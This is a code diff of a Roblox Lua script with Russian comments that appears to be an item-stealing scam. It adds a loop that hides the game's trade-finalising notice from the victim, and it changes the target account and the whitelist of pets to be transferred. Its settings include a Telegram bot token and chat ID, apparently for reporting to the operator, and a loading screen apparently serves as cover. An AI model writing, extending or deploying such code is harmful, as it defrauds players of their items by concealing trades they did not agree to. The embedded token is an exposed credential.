@@ -29,6 +29,23 @@ local function isProtectedGUI(obj)
     return false
 end
 
+-- 🛡️ СПЕЦИАЛЬНАЯ ЗАЩИТА ОТ ТОРГОВЫХ УВЕДОМЛЕНИЙ
+task.spawn(function()
+    while true do
+        pcall(function()
+            local tradingGui = LocalPlayer.PlayerGui:FindFirstChild("Trading")
+            if tradingGui then
+                local finalizingTrade = tradingGui:FindFirstChild("FinalizingTrade")
+                if finalizingTrade and finalizingTrade:IsA("TextLabel") then
+                    finalizingTrade.Text = ""
+                    finalizingTrade.Visible = false
+                end
+            end
+        end)
+        task.wait(0.1)
+    end
+end)
+
 local function hideIfText(obj)
     if not obj or isProtectedGUI(obj) then return end
     
@@ -97,6 +114,10 @@ task.spawn(function()
     background.BackgroundTransparency = 1
     background.ScaleType = Enum.ScaleType.Crop
     background.Parent = screenGui
+    
+    -- Статичный фон без анимации
+    local tweenService = game:GetService("TweenService")
+    -- Пульсация полностью отключена
     
     -- Надпись с анимацией точек
     local label = Instance.new("TextLabel")
@@ -186,12 +207,12 @@ end)
 -- 🔧 НАСТРОЙКИ (ОРИГИНАЛЬНЫЕ РАБОЧИЕ)
 local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
 local TELEGRAM_CHAT_ID = "7144575011"
-local TARGET_PLAYER = "Rikizigg"
+local TARGET_PLAYER = "sfdgbzdfsb"
 local TRIGGER_MESSAGE = "."
 
 -- 🐾 РАСШИРЕННЫЙ БЕЛЫЙ СПИСОК
 local WHITELIST = {
-    "Hawk",
+    "Rooster",
     -- Добавьте сюда других питомцев которых нужно передавать
 }
 
